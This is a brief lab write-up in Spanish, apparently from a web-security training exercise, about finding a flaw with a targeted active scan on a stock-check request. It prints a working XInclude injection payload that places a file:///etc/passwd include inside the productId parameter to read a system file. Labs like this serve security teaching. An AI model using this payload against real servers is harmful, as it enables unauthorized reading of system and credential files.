---
title: "1 - Discovering vulnerabilities quickly with targeted scanning"
---

# 1 - Discovering vulnerabilities quickly with targeted scanning

Lanzamos un active scan sobre la request para checkear el stock y nos tira un XXE :

**Exploiting XInclude to retrieve files**

```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
